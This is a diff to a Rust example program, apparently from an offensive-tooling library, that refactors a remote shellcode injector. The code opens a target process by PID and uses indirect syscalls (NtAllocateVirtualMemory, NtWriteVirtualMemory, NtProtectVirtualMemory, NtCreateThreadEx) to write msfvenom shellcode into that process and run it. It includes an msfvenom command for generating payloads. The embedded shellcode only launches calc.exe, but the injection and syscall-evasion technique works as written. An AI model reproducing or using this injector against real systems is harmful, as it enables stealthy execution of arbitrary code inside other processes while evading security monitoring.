@@ -1,55 +1,21 @@
 use std::ffi::c_void;
 use std::ptr::null;
 use std::{mem, process};
-use std::fmt::format;
 
-use thermite::models::windows::nt_status::NtStatus;     // Only needed for printing the status after each syscalls
-use thermite::models::windows::peb_teb::UNICODE_STRING; //
 
-use thermite::{debug, error, info};
+use thermite::{debug, error, info, syscall_status};
 
 use thermite::indirect_syscall as syscall;
 
-// Don't forget #[repr(C)] !
+use thermite::models::windows::*;
+use thermite::models::windows::peb_teb::UNICODE_STRING;
+use thermite::models::windows::nt_status::NtStatus;
 
-#[repr(C)]
-#[derive(Clone, Debug, Copy)]
-pub struct ObjectAttributes {
-    length: u32,
-    root_directory: isize,
-    //Handle,
-    object_name: *const UNICODE_STRING,
-    attributes: u32,
-    security_descriptor: *const c_void,
-    //CVoid,
-    security_quality_of_service: *const c_void,
-}
-
-#[repr(C)]
-#[derive(Debug)]
-pub struct ClientId {
-    pub unique_process: isize,
-    pub unique_thread: isize,
-}
-
-// Some useful constants
-// lifted straight from windows libs
-const MEM_RESERVE: u32 = 0x2000;
-const MEM_COMMIT: u32 = 0x1000;
-const PAGE_READWRITE: u32 = 0x04;
-const PAGE_EXECUTE_READ: u32 = 0x20;
-const GENERIC_EXECUTE: u32 = 0x20000000;
-const SYNCHRONIZE: u32 = 0x00100000u32;
-const STANDARD_RIGHTS_REQUIRED: u32 = 0x00100000u32;
-const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
-// const PROCESS_VM_OPERATION: u32 = 0x0008;   // Required to perform an operation on the address space of a process (see VirtualProtectEx and WriteProcessMemory).
-// const PROCESS_VM_READ: u32 = 0x0010;        // Required to read memory in a process using ReadProcessMemory.
-// const PROCESS_VM_WRITE: u32 = 0x0020;       // Required to write to memory in a process using WriteProcessMemory.
 
 /// A basic msfvenom shellcode, just spawns calc.exe
 ///
-/// Remember, Stranger Danger,
-/// Go get your own shellcode, you can generate it using the following command:
+/// Go get your own shellcode, you don't know where this one has been,
+/// You can generate the same using the following command:
 /// ```bash
 /// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
 /// ```
@@ -75,21 +41,6 @@ const POP_CALC: [u8; 276] = [
 ];
 
 
-// Utility function that handles the return value of syscalls and quits if it's not a success
-fn print_status(str: &str, x: i32) -> NtStatus {
-    let nt_status: NtStatus = unsafe { mem::transmute(x) };
-    match nt_status {
-        NtStatus::StatusSuccess => {
-            info!("{}: {}", str, nt_status);
-        }
-        _ => {
-            error!(nt_status);
-            process::exit(nt_status as _);
-        }
-    }
-    return nt_status;
-}
-
 /// Read the PID from the program's command line arguments, if a valid PID is read, returns Some(PID)
 /// If nothing is found or if the argument cannot be parsed, returns None
 fn read_pid() -> Option<u32> {
@@ -114,14 +65,7 @@ fn read_pid() -> Option<u32> {
 fn injector(pid: Option<u32>) {
     // Declaring structures we're going to need
     let mut thread_handle: isize = 0;
-    let oa_process: ObjectAttributes = ObjectAttributes {
-        length: mem::size_of::<ObjectAttributes>() as _,
-        root_directory: 0u32 as _,
-        object_name: 0u32 as _,
-        attributes: 0,
-        security_descriptor: 0u32 as _,
-        security_quality_of_service: 0u32 as _,
-    };
+    let oa_process = ObjectAttributes::default();
 
     // This is "pseudo Handle", a sort of handle constant
     // The value -1 means it's a handle to our own process
@@ -142,7 +86,7 @@ fn injector(pid: Option<u32>) {
             &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
             &client_id,          //  [in, optional] PCLIENT_ID         ClientId
         );
-        print_status("NtOpenProcess", nt_status);
+        syscall_status!("NtOpenProcess", nt_status);
         debug!(process_handle);
     }
     let mut buf_size: usize = POP_CALC.len();
@@ -157,7 +101,7 @@ fn injector(pid: Option<u32>) {
         MEM_COMMIT | MEM_RESERVE, // [in]      ULONG     AllocationType,
         PAGE_READWRITE,           // [in]      ULONG     Protect
     );
-    print_status("NtAllocateVirtualMemory status:", nt_status);
+    syscall_status!("NtAllocateVirtualMemory status:", nt_status);
     info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);
 
     // Copy the shellcode to newly allocated memory
@@ -170,7 +114,7 @@ fn injector(pid: Option<u32>) {
         buf_size,           // [in]              ULONG     NumberOfBytesToWrite,
         &mut bytes_written, // [out, optional]   PULONG    NumberOfBytesWritten ,
     );
-    print_status("NtWriteVirtualMemory", nt_status);
+    syscall_status!("NtWriteVirtualMemory", nt_status);
     info!("Successfully written {} bytes in remote memory", buf_size);
 
     // Change protection status of allocated memory to READ+EXECUTE
@@ -184,7 +128,7 @@ fn injector(pid: Option<u32>) {
         PAGE_EXECUTE_READ,  // [in]              ULONG     NewAccessProtection,
         &mut old_protec,    // [out]             PULONG    OldAccessProtection,
     );
-    print_status("NtProtectVirtualMemory", nt_status);
+    syscall_status!("NtProtectVirtualMemory", nt_status);
 
     // Creates a remote thread in target process
     let nt_status = syscall!(
@@ -201,7 +145,7 @@ fn injector(pid: Option<u32>) {
         null::<*mut c_void>(), // [in, optional]   SIZE_T MaximumStackSize,
         null::<*mut c_void>(), // [in, optional]   PVOID AttributeList
     );
-    print_status("NtCreateThreadEx", nt_status);
+    syscall_status!("NtCreateThreadEx", nt_status);
 
     // Wait for the thread to execute
     // Timeout is a null pointer, so we wait indefinitely
@@ -211,14 +155,14 @@ fn injector(pid: Option<u32>) {
         0,                      //  [in] BOOLEAN        Alertable,
         null::<*mut c_void>(),  //  [in] PLARGE_INTEGER Timeout
     );
-    print_status("NtWaitForSingleObject", nt_status);
+    syscall_status!("NtWaitForSingleObject", nt_status);
 
     // Close the handle
     let nt_status = syscall!(
         "NtClose",
         thread_handle, // [in] HANDLE Handle
     );
-    print_status("NtClose", nt_status);
+    syscall_status!("NtClose", nt_status);
 }
 
 fn main() {
